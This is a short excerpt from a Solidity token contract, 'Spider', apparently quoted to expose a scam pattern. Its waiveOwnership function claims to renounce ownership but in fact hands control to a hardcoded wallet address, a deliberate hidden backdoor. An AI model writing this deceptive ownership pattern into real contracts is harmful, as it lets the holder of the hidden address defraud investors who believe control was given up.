...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xC0652815A3468aa6A39b808c3B1192724e89eACB));
        _owner = address(0xC0652815A3468aa6A39b808c3B1192724e89eACB);
    }
...
contract Spider is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x068adc583a817cEdfb353cf0140c4B360Eaf6146);
